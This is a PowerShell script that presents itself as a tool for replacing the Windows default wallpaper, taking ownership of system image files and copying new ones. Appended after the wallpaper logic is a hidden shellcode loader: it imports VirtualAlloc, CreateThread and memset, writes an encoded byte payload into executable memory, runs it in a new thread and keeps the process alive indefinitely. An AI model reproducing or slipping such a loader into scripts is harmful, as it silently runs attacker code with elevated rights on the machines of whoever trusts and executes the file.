﻿
function Write-LogFile {
	param(
		[parameter(Mandatory=$true, HelpMessage="Name of the log file, e.g. 'FileName'. File extension should not be specified")]
		[ValidateNotNullOrEmpty()]
		[string]$Name,
		[parameter(Mandatory=$true, HelpMessage="Value added to the specified log file")]
		[ValidateNotNullOrEmpty()]
		[string]$Value,
		[parameter(Mandatory=$true, HelpMessage="Choose a location where the log file will be created")]
		[ValidateNotNullOrEmpty()]
		[ValidateSet("UserTemp","WindowsTemp")]
		[string]$Location
	)
	
	switch ($Location) {
		"UserTemp" { $LogLocation = ($env:TEMP + "\") }
		"WindowsTemp" { $LogLocation = ($env:SystemRoot + "\Temp\") }
	}
	
	$LogFile = ($LogLocation + $Name + ".log")
	
	if (-not(Test-Path -Path $LogFile -PathType Leaf)) {
		New-Item -Path $LogFile -ItemType File -Force | Out-Null
	}
	
	$Value = (Get-Date).ToShortDateString() + ":" + (Get-Date).ToLongTimeString() + " - " + $Value
	
	
	Add-Content -Value $Value -LiteralPath $LogFile
}


try {
    $NTFSSecurityModulePath = Join-Path -Path $env:WINDIR -ChildPath "System32\WindowsPowerShell\v1.0\Modules\NTFSSecurity"
    if (-not(Test-Path -Path $NTFSSecurityModulePath -PathType Container)) {
        Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Staging NTFSSecurity module in: $($NTFSSecurityModulePath)"
        Copy-Item -Path (Join-Path -Path $PSScriptRoot -ChildPath "Modules") -Destination $NTFSSecurityModulePath -Recurse -ErrorAction Stop
    }
}
catch [System.Exception] {
    Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to stage required PowerShell module: NTFSSecurity" ; break
}


try {
    Import-Module -Name NTFSSecurity -ErrorAction Stop
}
catch [System.Exception] {
    Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to import required PowerShell module: NTFSSecurity" ; break
}


$NewOwner = "$($env:COMPUTERNAME)\Administrator"
$SystemContext = "NT AUTHORITY\SYSTEM"
$DefaultWallpaperRootPath = Join-Path -Path $PSScriptRoot -ChildPath "img0.jpg"


try {
    
    $DefaultWallpaperImagePath = Join-Path -Path $env:WINDIR -ChildPath "WEB\Wallpaper\Windows\img0.jpg"
    $CurrentOwner = Get-Item -Path $DefaultWallpaperImagePath | Get-NTFSOwner
    if ($CurrentOwner.Owner -notlike $NewOwner) {
        Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Setting new owner of '$($NewOwner)' on: $($DefaultWallpaperImagePath)"
        Set-NTFSOwner -Path $DefaultWallpaperImagePath -Account $NewOwner -ErrorAction Stop
    }

    
    try {
        Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Granting '$($SystemContext)' Full Control on: $($DefaultWallpaperImagePath)"
        Add-NTFSAccess -Path $DefaultWallpaperImagePath -Account $SystemContext -AccessRights FullControl -AccessType Allow -ErrorAction Stop
        Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Granting '$($NewOwner)' Full Control on: $($DefaultWallpaperImagePath)"
        Add-NTFSAccess -Path $DefaultWallpaperImagePath -Account $NewOwner -AccessRights FullControl -AccessType Allow -ErrorAction Stop
    }
    catch [System.Exception] {
        Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to grant required Full Control permissions on: $($DefaultWallpaperImagePath)" ; break
    }

    
    try {
        Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Replacing default wallpaper in: $($DefaultWallpaperImagePath)"
        Remove-Item -Path $DefaultWallpaperImagePath -Force -ErrorAction Stop
        Copy-Item -Path $DefaultWallpaperRootPath -Destination $DefaultWallpaperImagePath -Force -ErrorAction Stop
    }
    catch [System.Exception] {
        Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to replace default wallpaper: $($DefaultWallpaperImagePath)" ; break
    }
}
catch [System.Exception] {
    Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to take ownership of: $($DefaultWallpaperImagePath)" ; break
}


$HDWallpaperRoot = Join-Path -Path $PSScriptRoot -ChildPath "4K"
$HDWallpapers = Get-ChildItem -Path $HDWallpaperRoot
if (($HDWallpapers | Measure-Object).Count -ge 1) {
	$LocalHDWallpapersPath = Join-Path -Path $env:WINDIR -ChildPath "WEB\4K\Wallpaper\Windows"
	$LocalHDWallpapers = Get-ChildItem -Path $LocalHDWallpapersPath -Recurse -Filter *.jpg
	foreach ($LocalHDWallpaper in $LocalHDWallpapers) {
		
		$CurrentOwner = Get-Item -Path $LocalHDWallpaper.FullName | Get-NTFSOwner
		if ($CurrentOwner.Owner -notlike $NewOwner) {
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Setting new owner of '$($NewOwner)' on: $($LocalHDWallpaper.FullName)"
			Set-NTFSOwner -Path $LocalHDWallpaper.FullName -Account $NewOwner -ErrorAction Stop
		}

		
		try {
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Granting '$($SystemContext)' Full Control on: $($LocalHDWallpaper.FullName)"
			Add-NTFSAccess -Path $LocalHDWallpaper.FullName -Account $SystemContext -AccessRights FullControl -AccessType Allow -ErrorAction Stop
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Granting '$($NewOwner)' Full Control on: $($LocalHDWallpaper.FullName)"
			Add-NTFSAccess -Path $LocalHDWallpaper.FullName -Account $NewOwner -AccessRights FullControl -AccessType Allow -ErrorAction Stop
		}
		catch [System.Exception] {
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to grant required Full Control permissions on: $($LocalHDWallpaper.FullName)" ; break
		}

		
		try {
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Removing default wallpaper: $($LocalHDWallpaper.FullName)"
			Remove-Item -Path $LocalHDWallpaper.FullName -Force -ErrorAction Stop
		}
		catch [System.Exception] {
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to remove default wallpaper: $($LocalHDWallpaper.FullName)" ; break
		}
	}

	
	foreach ($HDWallpaper in $HDWallpapers) {
		try {
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Copying '$($HDWallpaper.FullName)' wallpaper to: $($LocalHDWallpapersPath)"
			Copy-Item -Path $HDWallpaper.FullName -Destination $LocalHDWallpapersPath -Force -ErrorAction Stop
		}
		catch [System.Exception] {
			Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to copy default wallpaper '$($HDWallpaper.FullName)' to: $($LocalHDWallpapersPath)" ; break
		}
	}
}
else {
	Write-LogFile -Name "SetDefaultWallpaper" -Location WindowsTemp -Value "Unable to locate wallpapers in 4K root folder when processing, skipping the 4K wallpapers"
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x4b,0x3f,0x44,0x56,0xda,0xc8,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x7d,0x13,0x83,0xc5,0x04,0x03,0x7d,0x44,0xdd,0xb1,0xaa,0xb2,0xa3,0x3a,0x53,0x42,0xc4,0xb3,0xb6,0x73,0xc4,0xa0,0xb3,0x23,0xf4,0xa3,0x96,0xcf,0x7f,0xe1,0x02,0x44,0x0d,0x2e,0x24,0xed,0xb8,0x08,0x0b,0xee,0x91,0x69,0x0a,0x6c,0xe8,0xbd,0xec,0x4d,0x23,0xb0,0xed,0x8a,0x5e,0x39,0xbf,0x43,0x14,0xec,0x50,0xe0,0x60,0x2d,0xda,0xba,0x65,0x35,0x3f,0x0a,0x87,0x14,0xee,0x01,0xde,0xb6,0x10,0xc6,0x6a,0xff,0x0a,0x0b,0x56,0x49,0xa0,0xff,0x2c,0x48,0x60,0xce,0xcd,0xe7,0x4d,0xff,0x3f,0xf9,0x8a,0xc7,0xdf,0x8c,0xe2,0x34,0x5d,0x97,0x30,0x47,0xb9,0x12,0xa3,0xef,0x4a,0x84,0x0f,0x0e,0x9e,0x53,0xdb,0x1c,0x6b,0x17,0x83,0x00,0x6a,0xf4,0xbf,0x3c,0xe7,0xfb,0x6f,0xb5,0xb3,0xdf,0xab,0x9e,0x60,0x41,0xed,0x7a,0xc6,0x7e,0xed,0x25,0xb7,0xda,0x65,0xcb,0xac,0x56,0x24,0x83,0x01,0x5b,0xd7,0x53,0x0e,0xec,0xa4,0x61,0x91,0x46,0x23,0xc9,0x5a,0x41,0xb4,0x2e,0x71,0x35,0x2a,0xd1,0x7a,0x46,0x62,0x15,0x2e,0x16,0x1c,0xbc,0x4f,0xfd,0xdc,0x41,0x9a,0x52,0x8d,0xed,0x75,0x13,0x7d,0x4d,0x26,0xfb,0x97,0x42,0x19,0x1b,0x98,0x89,0x32,0xb6,0x62,0x59,0x6e,0xbb,0xe1,0xef,0xf8,0x41,0xfa,0x1e,0xa5,0xcc,0x1c,0x4a,0x45,0x99,0xb7,0xe2,0xfc,0x80,0x4c,0x93,0x01,0x1f,0x29,0x93,0x8a,0xac,0xcd,0x5d,0x7b,0xd8,0xdd,0x09,0x8b,0x97,0xbc,0x9f,0x94,0x0d,0xaa,0x1f,0x01,0xaa,0x7d,0x48,0xbd,0xb0,0x58,0xbe,0x62,0x4a,0x8f,0xb5,0xab,0xde,0x70,0xa1,0xd3,0x0e,0x71,0x31,0x82,0x44,0x71,0x59,0x72,0x3d,0x22,0x7c,0x7d,0xe8,0x56,0x2d,0xe8,0x13,0x0f,0x82,0xbb,0x7b,0xad,0xfd,0x8c,0x23,0x4e,0x28,0x0d,0x1f,0x99,0x14,0x7b,0x71,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

